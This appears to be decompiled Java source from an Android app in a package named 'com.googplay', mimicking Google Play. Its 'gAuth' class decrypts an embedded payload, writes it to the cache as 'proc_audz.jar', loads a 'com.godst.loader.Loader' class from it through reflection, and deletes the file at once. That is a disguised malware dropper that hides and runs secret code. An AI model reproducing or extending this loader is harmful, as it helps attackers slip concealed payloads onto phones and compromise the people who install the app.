package com.googplay;

import android.app.Service;
import android.content.Context;
import dalvik.system.BaseDexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;

public class gAuth {
    public static String DexPath;
    public static Context ctx;
    public static Method desmethod;
    public static byte[] dex;
    public static Method initmethod;

    /* renamed from: ob */
    public static Object f4ob;

    public static void Destroy() {
        try {
            desmethod.invoke(f4ob, new Object[0]);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void Init(Context context, Service service) {
        try {
            initmethod.invoke(f4ob, new Object[]{context, service, dex});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void LoadBaseDex() {
        try {
            Class loadClass = new BaseDexClassLoader(DexPath, ctx.getCacheDir(), ctx.getApplicationInfo().nativeLibraryDir, ctx.getClassLoader()).loadClass("com.godst.loader.Loader");
            f4ob = loadClass.newInstance();
            initmethod = loadClass.getMethod("Init", new Class[]{Context.class, Service.class, byte[].class});
            initmethod.setAccessible(true);
            desmethod = loadClass.getMethod("Destroy", new Class[0]);
            desmethod.setAccessible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void Setup(Context context, byte[] bArr) {
        ctx = context;
        dex = Utils.loaderDecrypt(bArr);
        DexPath = ctx.getCacheDir() + "/proc_audz.jar";
        TrySetupLoader();
    }

    public static void TrySetupLoader() {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(DexPath);
            fileOutputStream.write(dex);
            fileOutputStream.flush();
            fileOutputStream.close();
            LoadBaseDex();
            rmFile(DexPath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void rmFile(String str) {
        File file = new File(str);
        if (file.exists()) {
            file.delete();
        }
    }
}
